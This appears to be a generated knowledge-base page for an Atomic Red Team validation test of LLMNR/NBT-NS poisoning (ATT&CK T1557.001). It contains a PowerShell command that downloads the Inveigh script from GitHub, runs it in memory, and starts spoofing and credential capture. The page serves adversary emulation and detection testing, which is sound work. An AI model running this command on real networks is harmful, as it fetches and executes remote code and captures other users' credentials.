---
atomic_guid: "deecd55f-afe0-4a62-9fba-4d1ba2deb321"
title: "LLMNR Poisoning with Inveigh (PowerShell)"
framework: "atomic"
generated: "true"
attack_technique_id: "T1557.001"
attack_technique_name: "Adversary-in-the-Middle: LLMNR/NBT-NS Poisoning and SMB Relay"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1557.001/T1557.001.yaml"
build_date: "2026-04-27 19:12:28"
executor: "powershell"
aliases:
  - "deecd55f-afe0-4a62-9fba-4d1ba2deb321"
  - "LLMNR Poisoning with Inveigh (PowerShell)"
platforms:
  - "windows"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[kb/lolbas/index|LOLBAS]] • [[workspaces/index|Notes]]

Inveigh conducts spoofing attacks and hash/credential captures through both packet sniffing and protocol specific listeners/sockets. This Atomic will run continuously until you cancel it or it times out.

## ATT&CK Mapping

- [[kb/attack/techniques/T1557-adversary-in-the-middle#^t1557001-llmnr-nbt-ns-poisoning-and-smb-relay|T1557.001: LLMNR/NBT-NS Poisoning and SMB Relay]]

## Executor

- elevation_required: True
- name: powershell

### Command

```powershell
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
IEX (iwr "https://raw.githubusercontent.com/Kevin-Robertson/Inveigh/82be2377ade47a4e325217b4144878a59595e750/Inveigh.ps1" -UseBasicParsing)
Invoke-Inveigh -ConsoleOutput Y -NBNS Y -MDNS Y -HTTPS Y -PROXY Y
```

## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1557.001/T1557.001.yaml)
